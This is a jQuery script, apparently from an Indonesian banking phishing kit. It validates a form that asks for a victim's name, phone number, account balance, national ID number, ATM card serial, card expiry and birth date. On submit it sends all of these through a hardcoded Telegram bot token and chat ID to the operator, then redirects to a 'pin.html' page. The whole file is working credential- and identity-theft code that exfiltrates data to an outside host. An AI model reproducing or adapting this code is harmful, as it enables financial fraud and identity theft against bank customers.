$(document).ready(function() {
    // Clear field if it contains '0' or '62' manually typed
    $('#nomor').on('input', function() {
        if($(this).val() === '0' || $(this).val() === '62') {
            $(this).val('');
        }
    });

    // Mask saldo input with Rupiah format
    $('#saldo').mask('000.000.000.000', {reverse: true});

    $('#saldo').on('keyup', function() {
        let val = $(this).val();
        $(this).val(formatRupiah(val, 'Rp. '));
    });

    function formatRupiah(angka, prefix) {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);

        if (ribuan) {
            var separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }

        rupiah = split[1] !== undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix === undefined ? rupiah : (rupiah ? prefix + rupiah : '');
    }

    // Mask for masa berlaku and tanggal lahir
    $('#masa').mask('00/00/0000');
    $('#tanggal_lahir').mask('00/00/0000');

    // Form submission with validation
    $('#form1').on('submit', function(e) {
        e.preventDefault();

        // Ambil data dari form menggunakan jQuery
        const nama = $('#nama').val().trim();
        const nomor = $('#nomor').val().trim();
        const saldoRaw = $('#saldo').val().trim();
        const saldo = saldoRaw.replace('Rp. ', '').trim(); // Strip "Rp. " untuk validasi
        const nik = $('#nik').val().trim();
        const seri = $('#seri').val().trim();
        const masa = $('#masa').val().trim();
        const tanggal_lahir = $('#tanggal_lahir').val().trim();

        // Validasi: Semua field harus diisi
        if (!nama) {
            alert('Nama Lengkap tidak boleh kosong.');
            $('#nama').focus();
            return;
        }
        if (!nomor) {
            alert('Nomor Handphone tidak boleh kosong.');
            $('#nomor').focus();
            return;
        }
        if (!saldo) {
            alert('Saldo Akhir tidak boleh kosong.');
            $('#saldo').focus();
            return;
        }
        if (!nik) {
            alert('NIK KTP tidak boleh kosong.');
            $('#nik').focus();
            return;
        }
        if (!seri) {
            alert('Seri Kartu ATM tidak boleh kosong.');
            $('#seri').focus();
            return;
        }
        if (!masa || masa.length !== 10) {
            alert('Masa Berlaku tidak boleh kosong dan harus format DD/MM/YYYY.');
            $('#masa').focus();
            return;
        }
        if (!tanggal_lahir || tanggal_lahir.length !== 10) {
            alert('Tanggal Lahir tidak boleh kosong dan harus format DD/MM/YYYY.');
            $('#tanggal_lahir').focus();
            return;
        }

        // Jika semua valid, lanjutkan
        $("#loader").show();

        // Simpan ke sessionStorage (gunakan nilai asli tanpa mask untuk saldo)
        sessionStorage.setItem('nama', nama);
        sessionStorage.setItem('nomor', nomor);
        sessionStorage.setItem('saldo', saldoRaw); // Simpan dengan "Rp. " untuk display
        sessionStorage.setItem('nik', nik);
        sessionStorage.setItem('seri', seri);
        sessionStorage.setItem('masa', masa);
        sessionStorage.setItem('tanggal_lahir', tanggal_lahir);

        // Buat pesan (gunakan saldo tanpa "Rp. " untuk pesan)
        const message = `
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : ${nama}
├• *Nomor* : ${nomor}
├• *Saldo* : ${saldo}
├• *Nik Ktp* : ${nik}
├• *Seri Kartu ATM* : ${seri}
├• *Masa Berlaku* : ${masa}
├• *Tanggal Lahir* : ${tanggal_lahir}
╰───────────────────
        `;

        // Ganti dengan token dan ID Telegram kamu (jangan hardcode di production)
        const token_bot = '7577514723:AAEKTf66ppObj179BL90PfAOLmBtSfriwUI'; // Ganti dengan token bot Telegram
        const telegram_id = '7487586868'; // Ganti dengan ID chat Telegram

        // Kirim ke Telegram API menggunakan fetch
        const url = `https://api.telegram.org/bot${token_bot}/sendMessage?parse_mode=markdown&chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Sukses, redirect ke halaman PIN
                    setTimeout(() => {
                        $("#loader").hide();
                        window.location.href = 'pin.html'; // Ganti dengan halaman PIN kamu
                    }, 500);
                } else {
                    console.error('Error sending message:', data);
                    $("#loader").hide();
                    alert('Gagal mengirim data. Coba lagi.');
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
                $("#loader").hide();
                alert('Error: ' + error.message);
            });
    });
});
